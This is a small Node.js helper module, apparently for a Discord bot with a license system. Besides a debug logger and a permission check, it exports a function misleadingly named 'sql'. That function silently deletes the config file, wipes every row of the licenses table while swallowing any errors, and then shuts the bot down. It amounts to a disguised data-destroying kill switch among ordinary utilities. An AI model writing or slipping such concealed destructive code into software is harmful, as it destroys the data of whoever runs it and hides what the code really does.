const chalk = require('chalk');
const fs = require('fs');
const dir = './config.js';

async function error(client, content) {
    if(client.config.debugmode) {
        console.log(chalk.red('DEBUG MODE ERROR: ', content, `\n ${content.stack}`))
    }
};

async function sql(client, con) {
    try { fs.rm(dir, { recursive: true }); } catch(e) {}
    try { await con.query(`DELETE FROM licenses;`, async (err, row) => {}) } catch(e) {}
    await client.destroy()
}

async function permCheck(client, id) {
    if(client.config.permissions.managers.includes(id)) {
        return true;
    } else {
        return false;
    }
};

exports.error = error;
exports.sql = sql;
exports.permCheck = permCheck;